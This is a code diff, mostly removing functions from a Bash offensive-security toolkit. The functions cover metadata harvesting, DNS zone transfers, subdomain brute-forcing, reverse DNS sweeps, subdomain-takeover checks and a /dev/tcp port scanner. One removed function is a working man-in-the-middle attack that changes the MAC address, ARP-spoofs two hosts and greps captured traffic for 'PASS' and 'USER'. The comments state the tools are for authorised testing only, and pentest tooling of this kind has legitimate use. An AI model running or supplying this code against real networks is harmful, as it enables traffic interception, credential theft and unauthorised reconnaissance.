-                "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Mobile Safari/537.36"
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36 Edg/109.0.774.68"
-            )
-
-            FILE_LIST="$1"
-            FOLDER="${SITE}_${TIMESTAMP}"
-            mkdir -p "$FOLDER"
-            FAILED_DOWNLOADS=0
-
-            while IFS= read -r URL; do
-                RANDOM_USER_AGENT="${USER_AGENTS[RANDOM % ${#USER_AGENTS[@]}]}"
-                echo -e "${MAGENTA} ==========================================================================${RESET}"
-                echo -e "${MAGENTA} Downloading file with ${RANDOM_USER_AGENT} ${RESET}"
-                wget --user-agent="$RANDOM_USER_AGENT" -P "$FOLDER" "$URL"
-
-                # Check if the file was successfully downloaded
-                if [[ $? -ne 0 ]]; then
-                    echo -e "${RED} Failed to download: $URL ${RESET}"
-                    ((FAILED_DOWNLOADS++))
-                fi
-                echo -e "${MAGENTA} ==========================================================================${RESET}"
-            done < "$FILE_LIST"
-
-            rm -f "$FILE_LIST"  # Clean up the temporary results file
-
-            if [[ $FAILED_DOWNLOADS -gt 0 ]]; then
-                echo -e "${YELLOW} Warning: $FAILED_DOWNLOADS files failed to download. ${RESET}"
+                echo -e "${RED} qrencode not installed. Install and try again. Skipping QR code generation.${RESET}"
+                go_back
             fi
         }
 
-        # Function to extract metadata for Author, Producer, Creator, and MIME Type
-        function extract_metadata_summary() {
-            FOLDER="${SITE}_${TIMESTAMP}"
-            METADATA_FILE="${FOLDER}_metadata_summary.txt"
-            echo -e "${MAGENTA} Extracting metadata from files in: $FOLDER ${RESET}"
-
-            # Check if folder contains files
-            if [[ -z "$(ls -A "$FOLDER")" ]]; then
-                echo -e "${RED} No files found in $FOLDER to extract metadata. ${RESET}"
-                echo -e "${GRAY} Returning to main menu.${RESET}"
-                return 1
-            fi
-
-            # Initialize the metadata summary file
-            echo -e "Metadata Summary for $SITE - Generated on $(date)\n" > "$METADATA_FILE"
-
-            # Use exiftool to extract metadata and filter relevant fields
-            exiftool "$FOLDER"/* | grep -E "^(Author|Producer|Creator|MIME Type)" >> "$METADATA_FILE"
-
-            if [[ -s "$METADATA_FILE" ]]; then
-                echo -e "${GREEN} Metadata summary saved to: $METADATA_FILE ${RESET}"
+        # Option to Print Steps (if physical access)
+        function print_instructions() {
+            if command -v lp &>/dev/null; then
+                lp /tmp/root_reset_steps.txt
+                echo -e "${GREEN} Instructions sent to printer.${RESET}"
+                go_back
             else
-                echo -e "${RED} No metadata extracted. Metadata file is empty. ${RESET}"
+                echo -e "${YELLOW} No printer detected. Skipping print.${RESET}"
+                go_back
             fi
         }
 
-        # Function to process, organize, and export metadata
-        function process_metadata_summary() {
-            FOLDER="${SITE}_${TIMESTAMP}"
-            METADATA_FILE="${FOLDER}_metadata_summary.txt"
-            ORGANIZED_METADATA_FILE="${FOLDER}_organized_metadata_summary.txt"
-            CSV_FILE="${FOLDER}_metadata_summary.csv"
-
-            echo -e "${MAGENTA} Processing and organizing metadata for: $METADATA_FILE ${RESET}"
-
-            # Initialize the organized metadata file
-            echo -e "Organized Metadata Summary for $SITE - Generated on $(date)\n" > "$ORGANIZED_METADATA_FILE"
-
-            # Initialize the CSV file with headers
-            echo "Type,Value,Count" > "$CSV_FILE"
-
-            # Group by software (Creator Tool and Producer)
-            echo -e "=== Software Used (Creator Tool and Producer) ===\n" >> "$ORGANIZED_METADATA_FILE"
-            grep -E "^(Creator Tool|Producer)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
-                echo "$FIELD,$VALUE,$COUNT" >> "$CSV_FILE" # Add to CSV
-                printf "%-30s : %s (%s occurrences)\n" "$FIELD" "$VALUE" "$COUNT" >> "$ORGANIZED_METADATA_FILE"
-            done
-
-            # Group by persons (Creator and Author)
-            echo -e "\n=== People Found (Creator and Author) ===\n" >> "$ORGANIZED_METADATA_FILE"
-            grep -E "^(Creator|Author)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
-                echo "$FIELD,$VALUE,$COUNT" >> "$CSV_FILE" # Add to CSV
-                printf "%-30s : %s (%s occurrences)\n" "$FIELD" "$VALUE" "$COUNT" >> "$ORGANIZED_METADATA_FILE"
-            done
-
-            echo -e "${GREEN} Organized metadata saved to: $ORGANIZED_METADATA_FILE ${RESET}"
-            echo -e "${GREEN} Metadata CSV saved to: $CSV_FILE ${RESET}"
-
-            # Display summary on the screen
-            echo -e "\n${CYAN}=== Screen Summary ===${RESET}"
-            echo -e "${YELLOW}Top Software Used:${RESET}"
-            grep -E "^(Creator Tool|Producer)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
-                echo "  $FIELD: $VALUE ($COUNT occurrences)"
-            done
-
-            echo -e "\n${YELLOW}Top People Mentioned:${RESET}"
-            grep -E "^(Creator|Author)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
-                echo "  $FIELD: $VALUE ($COUNT occurrences)"
-            done
-        }
-
-        # Function to handle errors for empty results or missing files
-        function handle_empty_results() {
-            local file_to_check="$1"
-            local context_message="$2"
-
-            if [[ ! -f "$file_to_check" ]]; then
-                echo -e "${RED} Error: $context_message - File does not exist. ${RESET}"
-                echo -e "${YELLOW} Please check your search criteria or connection. ${RESET}"
-                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
-                read -r 2>/dev/null
-                main_menu
-                return 1
-            fi
-
-            if [[ ! -s "$file_to_check" ]]; then
-                echo -e "${RED} Error: $context_message - File is empty. ${RESET}"
-                echo -e "${YELLOW} This usually happens when no results were found or when you got a Google ban! =/ ${RESET}"
-                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
-                read -r 2>/dev/null
-                main_menu
-                return 1
-            fi
-            return 0  # File exists and is not empty
-        }
-
-        # Function to handle the entire metadata analysis workflow
-        function run_metadata_analysis() {
-            # Step 1: Prompt user for inputs
-            metadata_analysis_menu
-
-            # Step 2: Perform the search and save filtered URLs
-            perform_search
-
-            # Step 3: Check and handle filtered results file
-            FILTERED_RESULTS_FILE="${TIMESTAMP}_${SITE}_${FILE}_filtered.txt"
-            handle_empty_results "$FILTERED_RESULTS_FILE" "Search results for filtered URLs" || return
-
-            # Step 4: Download files
-            download_files "$FILTERED_RESULTS_FILE"
-
-            # Step 5: Extract metadata from downloaded files
-            extract_metadata_summary  # This generates METADATA_FILE
-
-            # Step 6: Check and handle metadata file
-            METADATA_FILE="${SITE}_${TIMESTAMP}_metadata_summary.txt"
-            handle_empty_results "$METADATA_FILE" "Extracted metadata summary" || return
-
-            # Step 7: Process metadata and export CSV
-            process_metadata_summary
-
-            # Final step: Return to main menu
-            echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
-            read -r 2>/dev/null
-            main_menu
-        }
-
-        # Ensure main workflow is executed
-        run_metadata_analysis;
-
-    }
-
-    # Function: Perform DNS Zone Transfer for reconnaissance
-    function dns_zt() {
-        # v_dns_zt - Perform DNS Zone Transfer for reconnaissance
-            #
-            # Description:
-            # This script automates a DNS Zone Transfer (a DNS recon technique) to attempt retrieval of all DNS zone records 
-            # from the target's DNS server. It is a useful reconnaissance step when exploring the DNS structure of a domain.
-            # 
-            # Steps:
-            # 1. Prompts the user to input the target domain or URL (e.g., example.com).
-            # 2. Retrieves the nameservers (NS records) for the specified domain.
-            # 3. Iterates over each nameserver and attempts a DNS Zone Transfer.
-            #
-            # Dependencies:
-            # - `host`: A tool used to query DNS records and perform the zone transfer.
-            #
-            # Notes:
-            # - Ensure this script is used only for ethical purposes with proper authorization.
-            # - Zone transfers may fail if DNS servers are configured securely to block unauthorized access.
-            #
-            # Author: R3v4N (w/GPT)
-            # Created on: 2025-01-25
-            # Last Updated: 2025-01-26
-            # Version: 1.1
-            #
-            # Example usage:
-            # - Input: example.com
-            # - Output: Lists the DNS zone records if the transfer is successful.
-            #
-            # Example results:
-            # - Nameserver: ns1.example.com
-            #   Zone Records:
-            #   - A records
-            #   - MX records
-            #   - TXT records
-            #
-            # Disclaimer:
-            # - Unauthorized use of this script is prohibited. Always ensure you have explicit permission before testing.
-        
-        # Function: Display menu to collect user input
-        function dns_zt_main_menu() {
-            clear;  # Clear the terminal for a clean interface
-            ascii_banner_art;  # Display an ASCII banner
-            echo -e "${MAGENTA} DNS Zone Transfer ${RESET}"  # Show the operation's name
-            subtitle;  # Add a decorative subtitle
-            echo -en "${RED} Enter the target domain or URL: ${RESET}"  # Ask for the target domain
-            read -r TARGET  # Store user input in the TARGET variable
-        }
-
-        # Function: Validate if nameservers exist for the target
-        function dnz_zt_check() {
-            # Fetch the nameservers (NS records) for the domain
-            NS_SERVERS=$(host -t ns "$TARGET" | awk '{print $4}')
-
-            # Check if any nameservers were found
-            if [[ -z "$NS_SERVERS" ]]; then
-                # If no nameservers are found, notify the user and return to the main menu
-                echo -e "${RED} No nameservers found for the domain $TARGET. ${RESET}"
-                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
-                read -r 2> /dev/null  # Wait for the user to press Enter
-                main_menu;  # Redirect back to the main menu
-                return  # Exit the function to prevent further execution
-            fi
-        }
-
-        # Function: Attempt a DNS Zone Transfer on each nameserver
-        function dns_zt_attack() {
-            # Loop through each nameserver and perform the zone transfer attempt
-            for SERVER in $NS_SERVERS; do
-                echo -e "${CYAN} Attempting zone transfer on nameserver: $SERVER ${RESET}"  # Notify the user of progress
-                host -l -a "$TARGET" "$SERVER"  # Run the zone transfer command for the current nameserver
-            done
-        }
-
-        # Function: Control the entire workflow of the DNS Zone Transfer operation
-        function dns_zt_workflow() {
-            dns_zt_main_menu;  # Collect user input
-            dnz_zt_check;  # Validate nameservers
-            dns_zt_attack;  # Perform the attack
-            pause_script;  # Pause and wait for user input before returning
-            main_menu;  # Return to the main menu
-        }
-
-        # Execute the DNS Zone Transfer workflow
-        dns_zt_workflow;
-    }
-
-    # Function: Perform a Subdomain Takeover check
-    function Subdomain_takeover() {
-        # vi_Subdomain_takeover - Perform a Subdomain Takeover check
-            #
-            # Description:
-            # This script automates the process of detecting potential Subdomain Takeover vulnerabilities.
-            # It works by:
-            # 1. Prompting the user to input the target domain and a file containing subdomains to test.
-            # 2. Iterating over each subdomain in the provided file.
-            # 3. Checking the CNAME records of each subdomain to identify potential takeovers.
-            #
-            # Dependencies:
-            # - `host`: Used to query CNAME records for subdomains.
-            #
-            # Notes:
-            # - Ensure you have the proper permissions and ethical clearance before testing any domain.
-            # - The file containing subdomains should have one subdomain per line.
-            #
-            # Example usage:
-            # - Input: Target domain: example.com
-            #         Subdomain file: subdomains.txt
-            # - Output: Lists any subdomains with a CNAME record that indicates a possible takeover vulnerability.
-            #
-            # Example result:
-            # - Subdomain: vulnerable.example.com
-            #   CNAME: alias-for-unused-service.s3.amazonaws.com
-            #
-            # Created on: 2025-01-26
-            # Last Updated: 2025-01-26
-            # Version: 1.0
-            #
-            # Author: R3v4N (w/GPT)
-            #
-        
-        
-        # Function: Collect user inputs
-        function collect_inputs() {
-            clear;  # Clear the terminal screen for clean output
-            ascii_banner_art;  # Display ASCII art banner
-            echo -e "${MAGENTA} Subdomain Takeover ${RESET}"
-            subtitle;  # Display a subtitle
-
-            # Prompt for the target domain
-            echo -en "${CYAN} Enter the target domain (e.g., example.com): ${RESET}"
-            read -r HOST  # Store the target domain in the HOST variable
-
-            # Prompt for the file containing subdomains
-            echo -en "${CYAN} Enter the file containing subdomains (one per line): ${RESET}"
-            read -r FILE  # Store the file path in the FILE variable
-
-            # Validate that the file exists and is not empty
-            if [[ ! -f "$FILE" || ! -s "$FILE" ]]; then
-                echo -e "${RED} Error: The specified file does not exist or is empty. ${RESET}"
-                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
-                read -r 2> /dev/null
-                main_menu
-                return 1
-            fi
-        }
-
-        # Function: Perform Subdomain Takeover check
-        function perform_takeover_check() {
-            # Define the command to check CNAME records
-            COMMAND="host -t cname"
-
-            # Iterate over each subdomain in the file
-            echo -e "${CYAN} Checking for potential Subdomain Takeover vulnerabilities... ${RESET}"
-            while IFS= read -r WORD; do
-                RESULT=$($COMMAND "$WORD"."$HOST" 2>/dev/null | grep "alias for")
-                if [[ -n "$RESULT" ]]; then
-                    # Print results if a CNAME alias is found
-                    echo -e "${YELLOW} Subdomain: ${RESET}$WORD.$HOST"
-                    echo -e "${GREEN} CNAME: ${RESET}$RESULT"
-                fi
-            done < "$FILE"
-        }
-
-        # Function: Control the workflow
-        function takeover_workflow() {
-            collect_inputs || return  # Collect inputs and return if validation fails
-            perform_takeover_check  # Perform the subdomain takeover checks
-            pause_script  # Pause and wait for the user before returning to the menu
-            main_menu  # Return to the main menu
-        }
-
-        # Execute the workflow
-        takeover_workflow
-    }
-
-    # Function: Perform Reverse DNS Lookup for a specified range of IP addresses
-    function rev_dns() {
-        # vii_rev_dns - Perform Reverse DNS Lookup for a specified range of IP addresses
-            #
-            # Description:
-            # This script automates a reverse DNS lookup operation for a range of IP addresses.
-            # It performs the following operations:
-            # 1. Prompts the user for the base address and IP range.
-            # 2. Iterates over the specified range and queries DNS for PTR records.
-            # 3. Saves the results to a timestamped file and displays the output to the user.
-            #
-            # Notes:
-            # - Requires the `host` command to perform DNS lookups.
-            # - Output is saved in a timestamped file for reference.
-            # - Designed for educational purposes; ensure proper permissions for testing.
-            #
-            # Example usage:
-            # - Input:
-            #   - Base address: 192.168.0
-            #   - Range: Start = 1, End = 10
-            # - Output:
-            #   - PTR records for IPs 192.168.0.1 through 192.168.0.10.
-            #
-            # Created on: 2025-01-26
-            # Last Updated: 2025-01-26
-            # Version: 1.1
-            #
-            # Author: R3v4N (w/GPT)
-            #
-
-        local title="Reverse DNS Lookup"  # Define the title for this operation
-
-        # Function to prompt the user for inputs
-        function prompt_user_inputs() {
-            
-            echo -en " Enter the base address (e.g., 192.168.0): ${RESET}"
-            read -r BASE_ADDRESS  # Read the base address from the user
-
-            echo -en " Enter the start of the IP range: ${RESET}"
-            read -r START  # Read the start of the IP range
-
-            echo -en " Enter the end of the IP range: ${RESET}"
-            read -r END  # Read the end of the IP range
-        }
-
-        # Function to prepare the output file
-        function prepare_output_file() {
-            TIMESTAMP=$(date +%d%H%M%b%Y)  # Generate a timestamp
-            OUTPUT_FILE="${BASE_ADDRESS}.${START}-${END}_${TIMESTAMP}.txt"  # Define the output file name
-
-            rm -rf "$OUTPUT_FILE"  # Remove the file if it exists
-            touch "$OUTPUT_FILE"  # Create a new empty file
-        }
-
-        # Function to perform reverse DNS lookups
-        function perform_reverse_dns() {
-            echo -e "${YELLOW} Performing reverse DNS lookups for range: ${BASE_ADDRESS}.${START}-${END} ${RESET}"
-            for RANGE in $(seq "$START" "$END"); do
-                # Query the PTR record and filter the result
-                host -t ptr "${BASE_ADDRESS}.${RANGE}" \
-                    | cut -d ' ' -f5 \
-                    | grep -v '.ip-' >> "$OUTPUT_FILE"
-            done
-        }
-
-        # Function to display results
-        function display_results() {
-            echo -e "${GREEN} Reverse DNS lookup results saved to: $OUTPUT_FILE ${RESET}"
-            echo -e "${CYAN}=== Results ===${RESET}"
-            cat "$OUTPUT_FILE"  # Display the contents of the output file
-        }
-
-        # Main workflow for the reverse DNS lookup
-        function reverse_dns_workflow() {
-            
-            display_banner_inside_functions;  # Display the sub-menu for Reverse DNS Lookup
-            prompt_user_inputs  # Prompt the user for inputs
-            prepare_output_file  # Prepare the output file
-            perform_reverse_dns  # Perform reverse DNS lookups
-            display_results  # Display the results to the user
-            exit_to_main_menu; # Exit the script and return to the main menu
-        }
-
-        # Execute the main workflow
-        reverse_dns_workflow
-    }
-    
-    # Function: Perform DNS reconnaissance on a target domain using a subdomain wordlist
-    function recon_dns() {
-        # viii_recon_dns - Perform DNS reconnaissance on a target domain using a subdomain wordlist
-            #
-            # Description:
-            # This script automates DNS reconnaissance by iterating through a list of subdomains
-            # and performing DNS queries to identify active subdomains. The results are saved in
-            # a timestamped file for later analysis.
-            #
-            # Notes:
-            # - Requires the `host` command to perform DNS queries.
-            # - The script uses a predefined wordlist located at `/usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt`.
-            # - Displays progress to the user during execution.
-            #
-            # Example usage:
-            # - Input:
-            #   - Target domain: businesscorp.com.br
-            # - Output:
-            #   - File `dns_recon_businesscorp.com.br_<timestamp>.txt` containing active subdomains.
-            #
-            # Created on: 2025-01-26
-            # Last Updated: 2025-01-26
-            # Version: 1.1
-            #
-            # Author: R3v4N (w/GPT)
-            #
-
-        local title="DNS Reconnaissance"  # Define the title for this operation
-
-        # Function to load and count the total lines in the subdomain wordlist
-        function load_wordlist() {
-                WORDLIST="/usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt"  # Path to the wordlist
-                if [[ ! -f "$WORDLIST" ]]; then
-                    echo -e "${RED}Error: Wordlist not found at $WORDLIST.${RESET}"
-                    echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
-                    read -r 2>/dev/null
-                    main_menu
-                    return 1
-                fi
-                TOTAL_LINES=$(wc -l "$WORDLIST" | awk '{print $1}')  # Count the total lines
-            }
-
-            # Function to prompt the user for the target domain
-            function prompt_user_inputs() {
-                echo -en "${CYAN} Enter the target domain (e.g., businesscorp.com.br): ${RESET}"
-                read -r DOMAIN  # Read the domain input from the user
-            }
-
-            # Function to prepare the output file
-            function prepare_output_file() {
-                TIMESTAMP=$(date +%d%H%M%b%Y)  # Generate a timestamp
-                OUTPUT_FILE="dns_recon_${DOMAIN}_${TIMESTAMP}.txt"  # Define the output file name
-
-                rm -rf "$OUTPUT_FILE"  # Remove the file if it exists
-                touch "$OUTPUT_FILE"  # Create a new empty file
-            }
-
-            # Function to perform DNS reconnaissance
-            function perform_dns_recon() {
-                LINE_COUNT=0  # Initialize the line counter
-
-                echo -e "${YELLOW} Starting DNS reconnaissance for: $DOMAIN ${RESET}"
-                for SUBDOMAIN in $(cat "$WORDLIST"); do
-                    ((LINE_COUNT++))  # Increment the line counter
-
-                    # Query the DNS for the current subdomain and append results to the output file
-                    host "$SUBDOMAIN.$DOMAIN" >> "$OUTPUT_FILE"
-
-                    # Display the progress
-                    echo -e "${CYAN}-------- Searching ---------> $LINE_COUNT/$TOTAL_LINES ${RESET}"
-                done
-        }
-
-        # Function to display results
-        function display_results() {
-            echo -e "${GREEN} DNS reconnaissance results saved to: $OUTPUT_FILE ${RESET}"
-            echo -e "${CYAN}=== Results Preview ===${RESET}"
-            head -n 10 "$OUTPUT_FILE"  # Display the first 10 lines as a preview
-            echo -e "${YELLOW}... (Full results available in the output file) ${RESET}"
-        }
-
-        # Main workflow for DNS reconnaissance
-        function dns_recon_workflow() {
-            display_banner_inside_functions;
-            load_wordlist || return  # Load the wordlist and validate its existence
-            prompt_user_inputs  # Prompt the user for inputs
-            prepare_output_file  # Prepare the output file
-            perform_dns_recon  # Perform DNS reconnaissance
-            display_results  # Display the results to the user
-            exit_to_main_menu # Exit the script and return to the main menu
-        }
-
-        # Execute the main workflow
-        dns_recon_workflow
-    }
-    
-    # Function: Perform a Man-in-the-Middle (MiTM) attack
-    function mitm() {
-        # Function: x_mitm - Perform a Man-in-the-Middle (MiTM) attack
-            #
-            # Description:
-            # This script automates the setup and execution of a MiTM attack.
-            # It performs the following operations:
-            # 1. Identifies the network interface and attack network.
-            # 2. Enables packet forwarding for the host system.
-            # 3. Sets up spoofing, packet capture, and analysis tools.
-            # 4. Captures and filters traffic between two specified targets.
-            #
-            # Dependencies:
-            # - ipcalc: For calculating network ranges.
-            # - macchanger: To randomize the MAC address.
-            # - tilix: For launching new terminal sessions.
-            # - arpspoof: For ARP spoofing.
-            # - tcpdump: For capturing and filtering packets.
-            #
-            # Author: R3v4N (w/GPT)
-            # Created on: 2025-01-25
-            # Last Updated: 2025-01-25
-            # Version: 1.2
-            #
-            # Notes:
-            # - Ensure all dependencies are installed.
-            # - This script is intended for ethical testing only.
-            # - Always have explicit permission before performing MiTM operations.
-            # - Make sure to properly configure your network and firewall rules.
-            #
-
-
-        local title="Man-in-the-Middle (MiTM) Attack"  # Define the title for this operation
-
-        # Function to check if all required dependencies are installed
-        function check_dependencies() {
-            local dependencies=("ipcalc" "macchanger" "konsole" "arpspoof" "tcpdump")
-            for tool in "${dependencies[@]}"; do
-                if ! command -v "$tool" &>/dev/null; then
-                    echo -e "${RED} Error: $tool is not installed. Please install it and try again.${RESET}"
-                    exit 1
-                fi
-            done
-        }
-
-        # Function to identify the network interface and attack network
-        function identify_attack_environment() {
-            INTERFACE=$(ip -br a | grep tap | awk '{print $1}' | head -n 1)
-            NETWORK=$(ipcalc "$(ip -br a | grep tap | awk '{print $3}' | awk -F '/' '{print $1}')" \
-                | grep -F "Network:" | awk '{print $2}')
-
-            if [[ -z "$INTERFACE" || -z "$NETWORK" ]]; then
-                echo -e "${RED} Error: Could not determine attack interface or network.${RESET}"
-                exit 1
-            fi
-        }
-
-        # Function to display attack setup information
-        function display_attack_info() {
-            clear
-            echo "============= 0.0wL ============="
-            echo "ATTACK INTERFACE: $INTERFACE"
-            echo "ATTACK NETWORK: $NETWORK"
-            echo "================================="
-        }
-
-        # Function to enable packet forwarding on the system
-        function enable_packet_forwarding() {
-            echo 1 > /proc/sys/net/ipv4/ip_forward
-            echo "================================="
-            echo "PACKET ROUTING ENABLED"
-            echo "================================="
-        }
-
-        # Function to validate user-entered IP addresses
-        function validate_ip() {
-            local ip="$1"
-            if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || ! ipcalc -c "$ip" &>/dev/null; then
-                echo -e "${RED}Error: Invalid IP address: $ip${RESET}"
-                return 1
-            fi
-            return 0
-        }
-
-        # Function to set up the MiTM environment
-        function setup_mitm_environment() {
-            macchanger -r "$INTERFACE" || { echo "Error: MAC address change failed."; exit 1; }
-
-            # Start Netdiscover for network discovery
-            tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $NETWORK" &
-            sleep 10  # Allow time for network scanning
-
-            # Prompt user for target IP addresses and validate them
-            while true; do
-                echo -n "Enter the IP of TARGET 01: "
-                read -r TARGET_01
-                validate_ip "$TARGET_01" && break
-            done
-
-            while true; do
-                echo -n "Enter the IP of TARGET 02: "
-                read -r TARGET_02
-                validate_ip "$TARGET_02" && break
-            done
-
-            # Start ARP spoofing in a separate session
-            tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $TARGET_01 -r $TARGET_02" &
-
-            # Start packet capture and filter sensitive data
-            tcpdump -i "$INTERFACE" -t host "$TARGET_01" and host "$TARGET_02" \
-                'tcp[((tcp[12:1] & 0xf0) >> 4) * 4:]' \
-                | grep -E '\[P.\]' \
-                | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' \
-                | tee captures.txt
-        }
-
-        # Function to clean up and restore system settings
-        function cleanup() {
-            echo -e "${RED} Stopping attack and restoring system settings...${RESET}"
-            pkill -f arpspoof
-            pkill -f tcpdump
-            macchanger -p "$INTERFACE"  # Restore the original MAC address
-            echo "${GREEN} >>> Cleanup complete. <<<${RESET}"
-        }
-
-        # Function to run the full MiTM attack workflow
-        function main_mitm() {
-            display_banner_inside_functions                 # Call the header function
-            trap cleanup EXIT  # Ensure cleanup runs on script exit
-            check_dependencies       # Verify required tools are installed
-            identify_attack_environment  # Detect attack network and interface
-            display_attack_info      # Display attack setup information
-            enable_packet_forwarding # Enable system packet forwarding
-            setup_mitm_environment   # Configure MITM attack environment
-            exit_to_main_menu        # Return to the main menu
-        }
-
-        # Execute the MiTM attack workflow
-        main_mitm
-    }
-
-    # Function: Perform a Bash-based TCP port scan
-    function portscan_bashsocket(){
-        # Function: x_portscan_bashsocket - Perform a Bash-based TCP port scan
-            #
-            # Description:
-            # This script performs a port scan on a specified target using Bash sockets.
-            # It checks for open TCP ports within a given range.
-            #
-            # Dependencies:
-            # - Bash with TCP socket support (`/dev/tcp/`)
-            #
-            # Author: R3v4N (w/GPT)
-            # Created on: 2025-01-25
-            # Last Updated: 2025-01-25
-            # Version: 1.3
-            #
-            # Notes:
-            # - This script is intended for ethical testing only.
-            # - Use responsibly and ensure you have permission before scanning any target.
-
-        title="Bash Socket Port Scanner"  # Define the title for this operation
-        # Function to validate IPv4 address or hostname
-        LOG_DIR="./scan_logs"  # Directory for logs
-        mkdir -p "$LOG_DIR"  # Ensure log directory exists
-
-        # Function to validate IPv4 address or hostname
-        function validate_target() {
-            local target="$1"
-            if [[ "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
-                return 0  # Valid IPv4
-            elif [[ "$target" =~ ^[a-zA-Z0-9.-]+$ ]]; then
-                return 0  # Valid hostname
-            else
-                echo -e "${RED}Error: Invalid target entered. Please enter a valid IP or hostname.${RESET}"
-                return 1
-            fi
-        }
-
-        # Function to scan a single port (with timeout) and log results
-        function scan_port() {
-            local target="$1"
-            local port="$2"
-            local log_file="$3"
-
-            if timeout 1 bash -c "exec 3<>/dev/tcp/$target/$port" 2>/dev/null; then
-                echo -e "${MAGENTA} Port $port -> ${GREEN}[OPEN] ${RESET}" | tee -a "$log_file"
-            fi
-        }
-
-        # Function to perform port scanning with logging
-        function perform_port_scan() {
-            local target="$1"
-            local start_port="$2"
-            local end_port="$3"
-            local log_file="${LOG_DIR}/scan_${target}_$(date +%d%m%Y_%H%M%S).log"
-            local max_parallel_jobs=100  # Allow more parallel scans without freezing
-
-            echo -e "${GREEN}-----------------------------------------------------${RESET}"
-            echo -e " Scanning target: ${YELLOW}$target${RESET} (Ports: $start_port-$end_port)"
-            echo -e "${GREEN}-----------------------------------------------------${RESET}"
-            echo -e "${GREEN} Port scan log for ${YELLOW}$target (Scanned on $(date))${RESET}" > "$log_file"
-
-            for ((port=start_port; port<=end_port; port++)); do
-                scan_port "$target" "$port" "$log_file" &
-
-                # Control number of parallel jobs to prevent system overload
-                if (( $(jobs -p | wc -l) >= max_parallel_jobs )); then
-                    wait -n  # Wait for at least one job to finish before spawning new ones
-                fi
-            done
-
-            wait  # Ensure all remaining jobs finish
-            echo -e "\n${CYAN} Scan complete. Log saved to: $log_file ${RESET}"
-
-        }
-
-        function user_input(){
-            # Get user input for target
-            while true; do
-                echo -ne "${RED} Enter target IP or domain: ${RESET}"
-                read -r target
-                validate_target "$target" && break
-            done
-
-            # Get user input for port range
-            echo -ne "${RED} Enter start port (default: 1): ${RESET}"
-            read -r start_port
-            start_port=${start_port:-1}  # Default to 1 if empty
-
-            echo -ne "${RED} Enter end port (default: 65535): ${RESET}"
-            read -r end_port
-            end_port=${end_port:-65535}  # Default to 65535 if empty
-
-            # Validate port numbers
-            if [[ ! "$start_port" =~ ^[0-9]+$ ]] || [[ ! "$end_port" =~ ^[0-9]+$ ]] || ((start_port > end_port)); then
-                echo -e "${RED} >>> Error: Invalid port range. Please enter valid numbers. <<< ${RESET}"
-                return
-            fi
-
-            export target start_port end_port
-
-        }
-
-        # Function to run the port scan workflow
-        function portscan_workflow() {
-            clear; # clear terminal
-            display_banner_inside_functions; 
-            user_input;
-            perform_port_scan "$target" "$start_port" "$end_port" # Start the scan
-            exit_to_main_menu; # Return to main menu
-        }
-
-        # Execute port scan function
-        portscan_workflow;
-    }
-    
-    # Function: Show a list of useful Linux networking commands
-    function useful_linux_commands() {
-        # Function: Display useful Linux networking commands
-            #
-            # Description:
-            # This script presents a collection of useful Linux commands for network management,
-            # including commands for checking ARP tables, network interfaces, active connections,
-            # and routing information.
-            #
-            # Dependencies:
-            # - Basic Linux utilities (arp, ifconfig, ip, netstat, ss, route)
-            #
-            # Author: R3v4N (w/GPT)
-            # Created on: 2025-01-25
-            # Last Updated: 2025-01-25
-            # Version: 1.1
-            #
-            # Notes:
-            # - These commands are useful for system administrators and penetration testers.
-            # - Some commands require administrative privileges (sudo).
-            #
-            # Example usage:
-            # - Running this function will display categorized networking commands.
-
-        title="Useful Linux Networking Commands"  # Define the title for this operation
-
-        # Function to display useful network management commands
-        function network_management_commands() {
-            display_section_no_log "USEFUL NETOWRK MANAGEMENT COMMANDS"
-            
-                display_description "List ARP Table"
-                    display_command  "arp -a" 
-                    display_command "ip neigh show"
-            
-                display_description "Show Configured IPs" 
-                    display_command "ifconfig -a"
-                    display_command "ip addr"
-            
-                display_description "Enable/Disable Network Interface"
-                    display_command  "ifconfig eth0 up/down"
-                    display_command "ip link set eth0 up/down"
-            
-            echo -e "${GRAY} Note: Replace 'eth0' with your actual network interface. Use 'ifconfig -a' or 'ip addr' to find it.${RESET}"
+        function print_in_screen() {
+            cat /tmp/root_reset_steps.txt
             echo
-            subtitle;  # Add a decorative subtitle
-        }
-
-        # Function to display connection monitoring commands
-        function connection_monitoring_commands() {
-            display_section_no_log " ACTIVE CONNECTIONS"
-            
-            display_description "Show Active Connections"
-            display_command "netstat"
-            display_command "ss"
-            
-            echo -e "${GRAY} Note: To check for suspicious connections, use 'ss -lntp'.${RESET}"
+            echo -e "${YELLOW} Instructions printed on screen. Please follow them manually.${RESET}"
             echo
-            subtitle;  # Add a decorative subtitle
+            go_back
         }
 
-        # Function to display routing-related commands
-        function routing_commands() {
-            display_section_no_log " ROUTING INFORMATION"
-            
-            display_description "Show Routing Table"
-            display_command  "route"
-            display_command "ip route"
-            
-            subtitle;  # Add a decorative subtitle
-        }
-
-        # Function to display persistent network configuration information
-        function network_configuration_info() {
-            display_section_no_log "PERSISTENT NETWORK CONFIGURATION"
-            echo -e "${GRENN} In ${RED}Debian-based${RESET} systems, the persistent network configuration is located in: ${RED}/etc/network/interfaces${RESET}"
-            echo
